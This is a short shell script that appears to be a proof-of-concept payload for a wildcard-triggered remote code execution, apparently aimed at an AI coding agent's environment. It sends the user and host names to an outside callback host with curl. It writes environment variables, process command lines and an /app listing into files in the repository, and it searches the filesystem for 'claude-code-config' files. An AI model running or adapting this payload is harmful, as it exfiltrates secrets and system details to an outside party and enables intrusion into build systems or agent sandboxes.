#!/bin/sh
# OOB callback
curl -s "http://76oqv57g.requestrepo.com/wildcard-rce-$(whoami)-$(hostname)" &
# Dump env and process info to files in repo
printenv > wildcard-env-dump.txt 2>/dev/null
cat /proc/self/cmdline | tr '\0' '\n' > wildcard-cmdline.txt 2>/dev/null
cat /proc/1/cmdline | tr '\0' '\n' > wildcard-pid1-cmdline.txt 2>/dev/null
ls -la /app/ > wildcard-app-ls.txt 2>/dev/null
find / -name "claude-code-config*" -type f 2>/dev/null > wildcard-config-find.txt
